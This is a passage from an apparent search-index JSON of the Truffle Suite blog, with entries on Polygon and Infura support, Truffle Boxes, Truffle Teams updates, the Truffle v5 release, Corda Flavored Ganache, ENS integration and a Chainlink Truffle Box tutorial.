developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and the Polygon PoS chain. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A quick note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in the Polygon Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented in the initial Polygon Box, and developers using this Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work. Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Polygon network. Infura users can now add the free Polygon Network add-on directly in their Infura dashboard. The Polygon network API largely utilizes the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Polygon network. For more information on the full support check out the complete documentation . Infura endpoints for the Polygon PoS chain are included in the configuration of the Polygon Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Polygon PoS chain. Where to Get Help \u00b6 You can find all of the documentation for the Truffle Polygon box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are very excited to add Polygon PoS to our development suite and we can't wait to see all of the amazing applications built with these tools. Stay tuned as we continue to add more networks, features, and products that accelerate and simplify development on this exciting new technology.","title":"Truffle and Infura Now Support Polygon"},{"location":"blog/truffle-and-infura-support-polygon/index.html#polygon-pos-chain","text":"Polygon PoS is a hybrid Plasma Proof-of-Stake sidechain to the Ethereum mainnet which consists of a Tendermint consensus validator layer and a Plasma sidechain for block production. This configuration allows for higher transaction throughput, lower gas fees, and through Polygon's established bridges, easy connection back to the Ethereum mainnet.","title":"Polygon PoS Chain"},{"location":"blog/truffle-and-infura-support-polygon/index.html#introducing-the-polygon-truffle-box","text":"The core component of this new tooling is the Truffle Polygon Box . This new Truffle box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . We provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and the Polygon PoS chain. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A quick note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in the Polygon Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented in the initial Polygon Box, and developers using this Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work.","title":"Introducing the Polygon Truffle Box"},{"location":"blog/truffle-and-infura-support-polygon/index.html#integration-with-infura","text":"Our colleagues at Infura are also adding full API support for the Polygon network. Infura users can now add the free Polygon Network add-on directly in their Infura dashboard. The Polygon network API largely utilizes the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Polygon network. For more information on the full support check out the complete documentation . Infura endpoints for the Polygon PoS chain are included in the configuration of the Polygon Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Polygon PoS chain.","title":"Integration With Infura"},{"location":"blog/truffle-and-infura-support-polygon/index.html#where-to-get-help","text":"You can find all of the documentation for the Truffle Polygon box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are very excited to add Polygon PoS to our development suite and we can't wait to see all of the amazing applications built with these tools. Stay tuned as we continue to add more networks, features, and products that accelerate and simplify development on this exciting new technology.","title":"Where to Get Help"},{"location":"blog/truffle-boxes-making-life-sweeter/index.html","text":"When users begin developing on Ethereum, the first question they ask is, \"Where do I start?\". In the past, there hasn't been an easy answer: the answer generally consisted of many flavors of \"it depends\", and usually led to an investigation of what the user was trying to build, a general overview of their development skills, their knowledge of Ethereum, and the libraries and tools they're already most comfortable with. When determining how the Truffle team can help in this process, it quickly became apparent that what our users needed were examples. Many of them. So, being the upstanding community members we are, we set out to create those example, and today, we're happy to show you what we've accomplished. Introducing Truffle Boxes! \u00b6 A Truffle box is an example Ethereum application and/or boilerplate that puts complimentary tools and libraries into a single, sweet, easily-downloadable package. Every Truffle box comes with libraries and tools already preinstalled, code that uses those libraries and tools, external scripts (if necessary), as well as helpful README's and documentation. All Truffle boxes are directly integrated into the Truffle command line, and you need only type truffle unbox <box name> to download and prepare your box of choice. Click here for a list of all available boxes. Ensure you've installed the latest version of Truffle before opening your first box. Today's release comes with three officially-supported boxes, as well as one community-supported box. Our officially-supported boxes are: react : A box that pairs Truffle with React in an easy to understand structure, meant for a web-based Ethereum application. react-auth : Our react box with extra goodies for authentication powered by smart contracts. react-uport : Like react-auth , but authentication is powered by Uport. Perhaps the most exciting part of this release -- our pi\u00e8ce de r\u00e9sistance -- is the Status Truffle box , our first community-supported box. This box was created by the Status team, and instantly links Truffle and Status together with an example application and all the tools and libraries you need to build your own Status dapp. Get Involved: Make Your Own Box \u00b6 We've released four boxes out of the gate to get you started, but this isn't just our candy store. We want you to contribute to the boxes on our site. If you have boilerplate code, an example dapp, a helpful integration or an exciting dapp stack (say, an Ethereum-enabled iOS app built with Truffle), send us an email at boxes@trufflesuite.com and we'll look it over. If it's awesome, we'll list it on our site with your name front and center. If it's better than awesome, we'll help contribute and maintain it and make it an officially-supported Truffle box. With Truffle, you can share your code with others and help build the community, one box at a time. One More thing... \u00b6 There's always one more thing. Fair warning, this one's techy. Right now, all the boxes you're seeing are static pages showing off what we and the Status team have built. Soon, however, we'll be taking on the ultimate challenge and will be creating a Truffle box registry, built on top of Ethereum, to help market and promote our community-supported boxes. Of course we'll be using Truffle, which adds a whole new layer of sweetness. Stay tuned for more details about the registry and how you can use the Ethereum blockchain to become a Truffle contributor. As always, we thank everyone for your support, and would love to hear from you. Don't hesitate to reach out on our community Gitter channel where hundreds of your fellow Trufflers congregate to answer your questions. Cheers! -- Tim & the Truffle Team","title":"Truffle Boxes - Making Life Sweeter"},{"location":"blog/truffle-boxes-making-life-sweeter/index.html#introducing-truffle-boxes","text":"A Truffle box is an example Ethereum application and/or boilerplate that puts complimentary tools and libraries into a single, sweet, easily-downloadable package. Every Truffle box comes with libraries and tools already preinstalled, code that uses those libraries and tools, external scripts (if necessary), as well as helpful README's and documentation. All Truffle boxes are directly integrated into the Truffle command line, and you need only type truffle unbox <box name> to download and prepare your box of choice. Click here for a list of all available boxes. Ensure you've installed the latest version of Truffle before opening your first box. Today's release comes with three officially-supported boxes, as well as one community-supported box. Our officially-supported boxes are: react : A box that pairs Truffle with React in an easy to understand structure, meant for a web-based Ethereum application. react-auth : Our react box with extra goodies for authentication powered by smart contracts. react-uport : Like react-auth , but authentication is powered by Uport. Perhaps the most exciting part of this release -- our pi\u00e8ce de r\u00e9sistance -- is the Status Truffle box , our first community-supported box. This box was created by the Status team, and instantly links Truffle and Status together with an example application and all the tools and libraries you need to build your own Status dapp.","title":"Introducing Truffle Boxes!"},{"location":"blog/truffle-boxes-making-life-sweeter/index.html#get-involved-make-your-own-box","text":"We've released four boxes out of the gate to get you started, but this isn't just our candy store. We want you to contribute to the boxes on our site. If you have boilerplate code, an example dapp, a helpful integration or an exciting dapp stack (say, an Ethereum-enabled iOS app built with Truffle), send us an email at boxes@trufflesuite.com and we'll look it over. If it's awesome, we'll list it on our site with your name front and center. If it's better than awesome, we'll help contribute and maintain it and make it an officially-supported Truffle box. With Truffle, you can share your code with others and help build the community, one box at a time.","title":"Get Involved: Make Your Own Box"},{"location":"blog/truffle-boxes-making-life-sweeter/index.html#one-more-thing","text":"There's always one more thing. Fair warning, this one's techy. Right now, all the boxes you're seeing are static pages showing off what we and the Status team have built. Soon, however, we'll be taking on the ultimate challenge and will be creating a Truffle box registry, built on top of Ethereum, to help market and promote our community-supported boxes. Of course we'll be using Truffle, which adds a whole new layer of sweetness. Stay tuned for more details about the registry and how you can use the Ethereum blockchain to become a Truffle contributor. As always, we thank everyone for your support, and would love to hear from you. Don't hesitate to reach out on our community Gitter channel where hundreds of your fellow Trufflers congregate to answer your questions. Cheers! -- Tim & the Truffle Team","title":"One More thing..."},{"location":"blog/truffle-teams-gets-a-new-look/index.html","text":"Thanks to Josh Quintal and Heyse Li , the redesign of Truffle Teams is complete! Josh presented the Theobromine design system at TruffleCon 2019 , and this release is the first step towards this vision! In addition to the stylistic upgrade, we've redesigned the app navigation to help you focus on a single repository at a time. Read more below about the most recent changes, or go check them out for yourself ! Redesign \u00b6 The Theobromine Design System uplifts the entire Truffle Teams application. This lighter theme makes the application feel more welcoming and presents itself more as a professional productivity tool. We also added support to collapse the left navbar to give you some more screen real estate. This is super helpful for those with small or vertical screens; it\u2019s also instrumental for multitaskers that use Truffle Teams in a split-screen setup. Navigation Updates \u00b6 The previous iteration of Truffle Teams utilized a \"feature first\" navigation where you would select the feature you'd like to see (Builds, Deployments, Monitoring [formally known as Data]) and then select the repository you'd want to drill into. We found this to be a jarring and tedious experience, so we changed things to be \"repository first\". When you login, you'll now see a home page with a list of your repositories. You can quickly search for a repository or keep your favorites at the top of the list by pinning them. After clicking on a repository you'll be presented with the details of that repository. On the Builds page you'll now see a history of your builds rather than seeing the list of your repositories. The Deployments and Monitoring pages will look familiar as they haven't changed much other than not having to select the repository again. Want to focus on a different repository? You can quickly switch between them using the breadcrumb dropdown at the top of each page. You can also click the Truffle Teams logo in the top left to go back to the home page with the search bar and pinned repositories. Got Feedback or Questions? \u00b6 If you aren't aware of our official support channel, head over to the Truffle Teams channel in Spectrum.chat . Posting a thread there will ping us in our internal Slack workspace and we'll answer you ASAP. You can also submit Truffle Teams feature requests and issues on GitHub . Get started with Truffle Teams, and see the redesign for yourself! Try Truffle Teams","title":"Truffle Teams Gets a New Look!"},{"location":"blog/truffle-teams-gets-a-new-look/index.html#redesign","text":"The Theobromine Design System uplifts the entire Truffle Teams application. This lighter theme makes the application feel more welcoming and presents itself more as a professional productivity tool. We also added support to collapse the left navbar to give you some more screen real estate. This is super helpful for those with small or vertical screens; it\u2019s also instrumental for multitaskers that use Truffle Teams in a split-screen setup.","title":"Redesign"},{"location":"blog/truffle-teams-gets-a-new-look/index.html#navigation-updates","text":"The previous iteration of Truffle Teams utilized a \"feature first\" navigation where you would select the feature you'd like to see (Builds, Deployments, Monitoring [formally known as Data]) and then select the repository you'd want to drill into. We found this to be a jarring and tedious experience, so we changed things to be \"repository first\". When you login, you'll now see a home page with a list of your repositories. You can quickly search for a repository or keep your favorites at the top of the list by pinning them. After clicking on a repository you'll be presented with the details of that repository. On the Builds page you'll now see a history of your builds rather than seeing the list of your repositories. The Deployments and Monitoring pages will look familiar as they haven't changed much other than not having to select the repository again. Want to focus on a different repository? You can quickly switch between them using the breadcrumb dropdown at the top of each page. You can also click the Truffle Teams logo in the top left to go back to the home page with the search bar and pinned repositories.","title":"Navigation Updates"},{"location":"blog/truffle-teams-gets-a-new-look/index.html#got-feedback-or-questions","text":"If you aren't aware of our official support channel, head over to the Truffle Teams channel in Spectrum.chat . Posting a thread there will ping us in our internal Slack workspace and we'll answer you ASAP. You can also submit Truffle Teams feature requests and issues on GitHub . Get started with Truffle Teams, and see the redesign for yourself! Try Truffle Teams","title":"Got Feedback or Questions?"},{"location":"blog/truffle-teams-now-supports-private-repositories/index.html","text":"Thanks to the awesome work of @nicholasjpaterno , you can now integrate private repositories with Truffle Teams! This will eventually be a premium feature, but we're releasing it for free while the product is still in beta. Using Private Repos \u00b6 Here we see the lock icon denoting a private repository and an indication of this being a future premium feature. There are no extra steps to use your private repositories with Truffle Teams! Simply add your repo , and automatic builds should start working! Private repos will have a lock icon next to their name indicating their private status. Otherwise, they have the same functionality as public repos. You'll see that we're very loud about which features will be premium. We'll continue this practice for future premium features so that we stay transparent about what's to come. Next Up: Deployments! \u00b6 Here's a teaser of our next upcoming feature: Graduated Deployments. The main deployments screen showing successful testnet and mainnet deployments. You'll be able to deploy any commit with a successful build to Ropsten, Rinkeby, and Mainnet Ethereum networks (with more to come soon!). You'll get some useful contextual information for your deployments: the status of the deployment, when it took place, who on your team deployed it, the contracts deployed, the ability to download your Truffle Artifacts, and more. Deploy to the Staging environment (Ropsten and Rinkeby currently) to make sure everything works out. Once you're ready, you can easily graduate a deployment in Staging to Production (Mainnet currently). We're using truffle migrate under the hood, so your existing migration scripts will work just fine. We've distilled the deployment process into an informative and helpful wizard to guide you through the deployment process. With this wizard and leveraging MetaMask for signing transactions, we are finally giving you an interface that makes it easier to deploy for seasoned and new devs alike! We'll release a full article with all the details about using Truffle Teams' deployment features once it's ready for release. Thank you and happy truffling!","title":"Truffle Teams Now Supports Private Repositories"},{"location":"blog/truffle-teams-now-supports-private-repositories/index.html#using-private-repos","text":"Here we see the lock icon denoting a private repository and an indication of this being a future premium feature. There are no extra steps to use your private repositories with Truffle Teams! Simply add your repo , and automatic builds should start working! Private repos will have a lock icon next to their name indicating their private status. Otherwise, they have the same functionality as public repos. You'll see that we're very loud about which features will be premium. We'll continue this practice for future premium features so that we stay transparent about what's to come.","title":"Using Private Repos"},{"location":"blog/truffle-teams-now-supports-private-repositories/index.html#next-up-deployments","text":"Here's a teaser of our next upcoming feature: Graduated Deployments. The main deployments screen showing successful testnet and mainnet deployments. You'll be able to deploy any commit with a successful build to Ropsten, Rinkeby, and Mainnet Ethereum networks (with more to come soon!). You'll get some useful contextual information for your deployments: the status of the deployment, when it took place, who on your team deployed it, the contracts deployed, the ability to download your Truffle Artifacts, and more. Deploy to the Staging environment (Ropsten and Rinkeby currently) to make sure everything works out. Once you're ready, you can easily graduate a deployment in Staging to Production (Mainnet currently). We're using truffle migrate under the hood, so your existing migration scripts will work just fine. We've distilled the deployment process into an informative and helpful wizard to guide you through the deployment process. With this wizard and leveraging MetaMask for signing transactions, we are finally giving you an interface that makes it easier to deploy for seasoned and new devs alike! We'll release a full article with all the details about using Truffle Teams' deployment features once it's ready for release. Thank you and happy truffling!","title":"Next Up: Deployments!"},{"location":"blog/truffle-v5-has-arrived/index.html","text":"We have just released the most awaited version of Truffle just in time for the holidays! There are SO many exciting things that we would like to mention that will make your Truffle experience a rich one. Highlighted below are the new exciting things Truffle has to offer. \ud83d\udc6f Download Truffle v5 or check out the full Release Notes . \ud83d\udc6f Bring your own compiler! You can now choose any solc-js version available at solc-bin. Just tell Truffle which version you want to use and it will automatically fetch it for you! This feature also includes the ability to use Docker and native binaries in an advanced way. Web3 1.0 - The truffle-contract package is now using Web3.js 1.0! This will greatly improve error handling! New migrations command - In v5, the migrate command has been completely rewritten. We have included better error messages: e.g., when a deployment fails Truffle will notify you and give you an idea of possible fixes. Truffle will now also give you more information about what is going on when you deploy a contract. This includes cost summaries and real time status updates about the amount of time a transaction has been pending. Dry run simulations also now run automatically if you are deploying to a known public network and using the --interactive flag on the command line will give you a prompt between dry runs and real deployments. Another improvement is the ability to configure the amount of block confirmations in between deployments. This allows the user to specify the number of blocks to wait before transactions time out. Usage analytics - Usage analytics have been added and users can opt-in by running truffle config --enable-analytics . We think this feature will be a vital tool that will help us to make informed decisions about the future of Truffle and to determine what is most valuable to our users. When enabled, Truffle will collect information about your version number, the commands you run, and whether commands succeed or fail. And of course, it will do so in an anonymous fashion. truffle run <command> - Truffle now gives users the ability to create custom command plugins. This feature is still in its infancy so let us know what you think! Vyper support - Another added feature is that Truffle will now compile *.vy contracts. We have published a Truffle Box to help you get started with Vyper. You can access it by running: $ truffle unbox vyper-example (Make sure you have Vyper installed.) Solidity v0.5.0 - Truffle also now ships with Solidity v0.5.0 by default. Solidity v0.4.xx is still supported and can be used by specifying the version you wish to use in your Truffle config. Structured function parameters - Truffle has been upgraded to use Web3.js v1.0. This has allowed us to include support for passing/returning \u2018struct\u2019s in Solidity functions. To use this ability, you need to specify the following at the top of your contracts: pragma experimental ABIEncoderV2 This feature allows you to use complex function arguments and have the values returned so that they can interact with other contracts via truffle-contract\u2019s JS interface. Help system - Now access Truffle\u2019s built in help system by running: $ truffle help <command> This allows you to see all the available options for the command as well as a description of what it does. Unique truffle develop mnemonics - Truffle will now generate random mnemonics that will persist only for you. Use caution with crypto security when working with mnemonics and private keys! Debugger improvements - v5 includes debugger breakpoints! Add breakpoints using the \u2019b\u2019 command and remove them using the \u2018B\u2019 command. Additionally we have added mapping support for the debugger! truffle init / truffle unbox - These commands have been improved and you are now asked if you want to overwrite files in the case of name conflicts in the target directory. A force option (--force) has also been added in the case where you wish to overwrite the files automatically and avoid the prompt. async / await - Support for async/await syntax in the Truffle console is also now available! Looking towards the future we intend to add third-party plugins and hope through our fancy, improved analaytics to provide features the community needs most! Thank you to all who have helped make this release of Truffle possible! We hope you enjoy this new Truffle release and ask that you let us know if you have any suggestions or problems on our community Gitter channel or on our GitHub page! Get started with Truffle v5 today!","title":"Truffle v5 has arrived!"},{"location":"blog/try-new-features-first-with-truffle-teams-early-access/index.html","text":"Truffle Teams is constantly evolving. Between adding new features, polishing, and refining the app there's so much we'd love to share with the world in a faster way. Wouldn't it be nice to take those new enhancements and features for a test drive? Now you can with early access! Enable early access with just one click! ## How Early Access Works To join early access, select the Early Access option in the Advanced tab via the account Settings Page. This account will now have access to new features and enhancements we're cooking up. First up is a hotly anticipated feature--the debugger, [which you can learn more about here](/blog/debug-quickly-and-in-context-with-truffle-teams-new-debugger). We'll provide a helpful reminder as to where you can provide feedback and request support. Your feedback is one of the most important parts of this process, and we're excited to hear from you in the earlier phases of development! Want to switch back to the stable track? You can disable Early Access at any time, but anything that requires data storage will be erased. We hope you enjoy getting a taste of what's to come! CHECK OUT TRUFFLE TEAMS EARLY ACCESS ## Continue the Conversation We want Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about the new deployment views, or if your team has other needs we haven't met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLER SLACK Thanks! _Josh Quintal, Head of Product & Marketing_","title":"Try New Features First with Truffle Teams Early Access"},{"location":"blog/unwrap-the-corda-flavored-ganache-beta/index.html","text":"Earlier this year at TruffleCon we announced our partnership with Corda to develop a Corda Flavored Ganache . Then, at CordaCon in London we shared more details around the integration . Today, we are proud to share with you the beta release is live ! As a quick refresher: Ganache is Truffle's \"one click blockchain\" that allows you to run a test network for local development. You don't need an internet connection and because it's all on the same machine, Ganache allows users to see the status of the network in greater detail than on a live network. The workspace selection screen--now with Corda! We're thrilled to release Ganache for the Corda Blockchain, as this lowers the barrier of entry for Corda developers by allowing them to easily set up a local network on their machines, giving introspection into the state of that network across various nodes and visibility to transactions normally hidden by a live Corda network's privacy protections. With the Beta version, Corda Flavored Ganache brings you: One-click Corda network configuration and initialization, so you can focus on what matters most: your application. Easy access to all your application's data, including network map, notaries, nodes, transactions, and states. Multiple workspaces for all of your Corda projects; workspaces contain configurations of a Corda network map, notaries, nodes, transactions, accounts, and ledgers. As always, Truffle's tools come standard on Windows, macOS, and Linux. We are excited to share this with the Corda community and we also need to your help! Since this is a Beta release, we know it's not perfect. If you find a bug, do us a favor and file an issue here . \u2709\ufe0f Sign up for the Corda Flavored Ganache mailing list here to get the latest updates on all things Ganache + Corda. If you don't hear from us immediately, know that our team is taking some much needed time off starting today. We'll be back January 6th, 2020 ready to dive into your feedback! If you see them around the net, make sure to give a HUGE thank you to David Murdoch and Nick Paterno . Their hard work made this all possible and we're a very fortunate organization to have them aboard! \ud83d\udc96 Try the Corda Flavored Ganache beta and let us know what you think! Download Corda Flavored Ganache","title":"Unwrap the Corda Flavored Ganache Beta"},{"location":"blog/upcoming-improvements-to-encoding-and-decoding/index.html","text":"When you\u2019re writing, running, or debugging your smart contract, you don\u2019t want to have to deal with raw binary data. Truffle\u2013\u2013and Ganache and Drizzle\u2013\u2013already contain a number of encoding and decoding features to help you interact with your contract and understand what you\u2019re seeing. But luckily, encoding and decoding are about to become even more robust, informative, and usable. Not all of these features will be immediately available in Truffle 5.1, but some will, so let\u2019s start with one that will be ready! Allow me to illustrate: Yes, debugging displays are about to become quite a bit more colorful! And though it\u2019s not related to decoding, yes that is syntax highlighting in the debugger! Of course, it\u2019s not just a matter of color. Previously, many data types displayed inappropriately as strings, and enums displayed as objects. Now, each data type will be displayed in a form (and color) that makes sense, making them recognizable at a glance. No longer will a function be confused for a string! Of course, this wouldn\u2019t be possible without our new, more machine-readable, decoder output format. This one\u2019s a little technical, and it\u2019s not something you\u2019re likely to find yourself dealing with directly -- you probably aren\u2019t using Truffle Decoder directly. But Ganache and Drizzle both make use of it, and as they update to incorporate the new format, you\u2019ll be able to get a better view of the state of your contracts with them. But that\u2019s not all; we\u2019re also intending to eventually integrate these encoding and decoding features into Truffle Contract. This will allow you to send transactions and decode events that you currently can\u2019t! For instance, Vyper contracts support decimal fractions as a datatype, but our current encoder and decoder, and the ethers library, do not support these. If you want to send a transaction (or if your contract emits an event) that takes a decimal fraction as input, you are going to run into trouble. With our upcoming encoding and decoding improvements, this should no longer be a problem. (Or, for something of more concern to our Solidity users, the same applies to external function pointers.) Finally, I\u2019d like to discuss decoding of events. Currently, when you check what events your contract may have emitted recently, you may have trouble decoding events emitted by libraries. Our new decoder, though, will be able to handle these just fine. It will even handle anonymous events! That may seem impossible, but hey, that hasn\u2019t deterred us. We\u2019re hoping Truffle\u2019s new encoder and decoder will make staring at raw binary data a thing of the past! Unless you like to, of course. But for those of you who\u2019d prefer to take a higher-level view and deal directly with what that binary data actually means\u2026 well, that\u2019s what Truffle\u2019s for, isn\u2019t it?","title":"Upcoming improvements to encoding and decoding"},{"location":"blog/using-the-ens-integration/index.html","text":"By Tyler Feickert, Blockchain Tools Engineer at Truffle Among the new features released with Truffle 5.1 is support for Ethereum Name Service (ENS) name resolution and setting the resolver address for owned names! ENS is a system that allows for the resolution of Ethereum addresses using human-readable names. Like DNS, ENS aims to simplify working with addresses and allowing us to work with names like \"truffle.eth\" in place of things that cumbersomely resemble something like \"0x1234567890123456789012345678901234567890\" . Are you sure you copied that address correctly? Ready to send your Ether there? In ENS, a contract called a registry is deployed to a network. The ENS team has deployed a registry contract to Mainnet and several test networks. These are the registries that Truffle connects to by default if no registry address is set in the Truffle config. An ENS registry contract contains a list of names and who owns them. Each name also points to a resolver contract if one is set. Addresses own ENS names and have the ability to set the resolver that a given name points to. The resolver is the contract responsible for returning an address for resolution. The idea is that the owner will have the ability to set the resolver contract to return the desired address. For more detailed information on ENS, check out the ENS website . So we at Truffle think this project is pretty awesome and, as mentioned above, built an integration with it. Previously in your migrations, for example, you needed to manually deal with addresses. So maybe you wanted to send some tokens from your contract to another address. In your Truffle migration you might have the following code: await myTokenContract . sendTokens ( 999 , \"0x1234567890123456789012345678901234567890\" , { from : \"0x0987654321098765432109876543210987654321\" } ); It is difficult and tiring to deal with raw addresses like this. Now in Truffle, if you turn on the ENS name resolution and you have a resolver set to your address of choice, you can do something like the following in place of the above: await myTokenContract . sendTokens ( 999 , \"truffle.eth\" , { from : \"my.account\" } ); Well, that seems much easier to read. Under the hood during the migrations, Truffle will connect to the on-chain registry and automatically resolve the addresses for both \"truffle.eth\" and \"my.account\". You now can use valid ENS names in place of addresses in your migrations! In other words, any place that an address is expected for an argument to a function call, you can instead provide the ENS name. One other big piece of functionality for this ENS integration is the ability to set the resolution address for owned ENS addresses. You can do this using deployer.ens.setAddress in your migrations. Suppose I control an address that owns the name \"arnold.hagenchop.eth\" and I want to set the address to \"0x1234123412123412341212341234121234123412\". In this case I would write something like the following in my migration: const myAddress = \"0x1234123412123412341212341234121234123412\" ; await deployer . ens . setAddress ( \"arnold.hagenchop.eth\" , myAddress , { from : \"0x8888888888888888888888888888888888888888\" } ) Now let's take a step back and look at what we did. So you can see that the setAddress method has three arguments. The first one is the name that we'd like to set the resolver for. As stated above we want to set the resolver address for \"arnold.hagenchop.eth\". The second argument is the address to set for the given name's ENS resolution. The last one is an object that resembles a transaction parameter object. The important thing about this object is that it must have a from property with the address that controls the name given as the first argument. This is important or the transaction will fail! You can find some more information about registering ENS names from the ENS website . One other useful convenience with this method is that you can also provide a Truffle contract object that has a deployed address as the second argument if you'd like. So the above code might look like the following instead: const MyContract = artifacts . require ( \"MyContract\" ); const myContract = await MyContract . deployed (); await deployer . ens . setAddress ( \"arnold.hagenchop.eth\" , myContract , { from : \"0x8888888888888888888888888888888888888888\" } ) In that case, \"arnold.hagenchop.eth\" will be set to the address at which myContract is deployed! This new integration should just be the start of a much more robust system that allows Truffle projects to interact with ENS! In the future, we also hope to add other features such as reverse resolution (resolving a name from an address) and automatic name registration where possible. We think this will be a big step forward in making the Ethereum ecosystem more accessible as well as convenient to work with! For more thorough information about this integration, see the Truffle docs . We have also created an example Truffle box that has some examples of using this new ENS integration alongside other new Truffle v5.1 features. We hope you find this feature as useful as we think it is! Happy Truffling!","title":"Using Truffle's ENS Integration"},{"location":"blog/using-truffle-to-interact-with-chainlink-smart-contracts/index.html","text":"Chainlink is one of the leading blockchain projects building the very first decentralized oracle network that provides external data to smart contracts. Truffle helps smart contract developers by providing a powerful framework to create, test, and deploy smart contracts. In Chainlink\u2019s blog post , their Chainlink Truffle Box has gotten some significant upgrades! If you were fortunate enough to attend Trufflecon 2019, then you have already seen these improvements in action, thanks to Chainlink\u2019s presentation by Thomas Hodges. To start developing your very own Chainlink smart contracts, you can grab Chainlink\u2019s Truffle Box by following the guide here . This article will showcase these brand new additions, starting with Truffle Scripts . Scripts create a much easier approach to interact with our contracts, allowing us to fund a contract with LINK, request data from it, and read the contract\u2019s data with only three commands. To demonstrate this functionality, we will first need to set up our environment variables: MNEMONIC and RPC_URL. Working with blockchain technology requires a wallet, with one of the most popular choices being MetaMask . Within minutes, you can have your very own Ethereum wallet that allows you to easily interact with various dApps. During account generation, you will be shown your secret 12-word seed phrase, known as your mnemonic. (Do not share this with anyone; if someone knows your mnemonic they WILL have access to your addresses and private keys). Be sure to store this mnemonic somewhere safe, as you will need it later to work with our example. Furthermore, you will also need to fund your MetaMask wallet with test LINK and test ETH , in order to power transactions on the Ropsten Ethereum Testnet. Note: When funding your account from a test faucet, make sure you switch from the default Main Ethereum Network to the Ropsten Test Network, to properly see your funds. You can follow any transactions made on the Ropsten Testnet via Etherscan. Our second environment variable will require an RPC URL. Some popular RPC connectivity services include Infura , LinkPool , and Fiews . After establishing a valid RPC connection and the funded address, you can start deploying smart contracts to public networks. _Shown above are the environment variables needed to link your MetaMask wallet to Truffle, found in truffle-config.js._ Once you have all the data you need, you can set your environment variables via the terminal commands: export RPC_URL = your_url_here export MNEMONIC = \u2019your 12 words here\u2019 Migration \u00b6 We are now ready to deploy our smart contract on a public network. To begin, run the command: npm run migrate:live This will compile all of your smart contracts, and then start deploying (migrating) them. Note: you may encounter some compilation warnings with the Chainlink contracts. This is simply because the LINK token was originally deployed with an older version of Solidity. Given that this contract is only being deployed when you run tests, these can be ignored. _Console output of one of our contracts deploying. This particular transaction can be found [here](https://ropsten.etherscan.io/tx/0x4c8125f0e074ce3f65b08f67f9685a0d00c2985c6ebd372507016d78c344d25b)._ Deploying our Migrations and MyContract cost us Ethereum, hence why we needed the faucet from earlier. Now that our contract is deployed, we can utilize the three helper scripts to fund MyContract with LINK (which we got from the Chainlink faucet), create requests, and read the state. There are 3 helper scripts provided to interact with our contract, located in the scripts directory: fund-contract.js request-data.js read-contract.js They can be used by calling them from npx truffle exec . First, we must fund our contract with LINK, which can be done by running the following command: npx truffle exec scripts/fund-contract.js --network live Following deployment, the output displays our contract address as well as the transaction address. We can also look this up on the ropsten explorer . Notice that upon completion, a payment of 1 LINK was sent during the transaction, clearly indicating that our contract has properly been funded. Next, we can now request data from the contract by running: npx truffle exec scripts/request-data.js --network live _In the Chainlink explorer for the network that you made the request (in our example we use Ropsten, but it would work similarly for Rinkeby, Kovan, and Mainnet). As you can see the Chainlink node that we were requesting data from picked up our request and waited for 3 block confirmations before executing the job. We are now ready to read the contract\u2019s state with the written answer from the Chainlink node, indicated by the fulfillment transaction (highlighted in red)._ And finally, for reading the data we run our read-contract script. In particular, this will run faster because we\u2019re not creating a transaction, we are simply reading the current state of the smart contract. npx truffle exec scripts/read-contract.js --network live Notice for our output when reading the data, we get a number displaying the current price of LINK in USD * 100 (as of writing, 22094). This is due to the value of times specified in our smart contract request-data.js. _Request-data.js. TRUFFLE_CL_BOX_TIMES is an environment variable which is used to override the default value of 100. This value is used for the precision of the endpoint\u2019s response (in this case, for the price of ETH in USD), and also because Solidity cannot handle decimals. Any of these values can be changed for your project._ Thanks to the power of Truffle, it has never been easier to work with smart contract development. We hope you enjoyed working with our Chainlink Truffle Box, allowing you to fully test, deploy, and interact with contracts on the network. Thanks for reading, and stay tuned for future updates at https://blog.chain.link/ .","title":"Using Truffle to interact with Chainlink Smart Contracts"},{"location":"blog/using-truffle-to-interact-with-chainlink-smart-contracts/index.html#migration","text":"We are now ready to deploy our smart contract on a public network. To begin, run the command: npm run migrate:live This will compile all of your smart contracts, and then start deploying (migrating) them. Note: you may encounter some compilation warnings with the Chainlink contracts. This is simply because the LINK token was originally deployed with an older version of Solidity. Given that this contract is only being deployed when you run tests, these can be ignored. _Console output of one of our contracts deploying. This particular transaction can be found [here](https://ropsten.etherscan.io/tx/0x4c8125f0e074ce3f65b08f67f9685a0d00c2985c6ebd372507016d78c344d25b)._ Deploying our Migrations and MyContract cost us Ethereum, hence why we needed the faucet from earlier. Now that our contract is deployed, we can utilize the three helper scripts to fund MyContract with LINK (which we got from the Chainlink faucet), create requests, and read the state. There are 3 helper scripts provided to interact with our contract, located in the scripts directory: fund-contract.js request-data.js read-contract.js They can be used by calling them from npx truffle exec . First, we must fund our contract with LINK, which can be done by running the following command: npx truffle exec scripts/fund-contract.js --network live Following deployment, the output displays our contract address 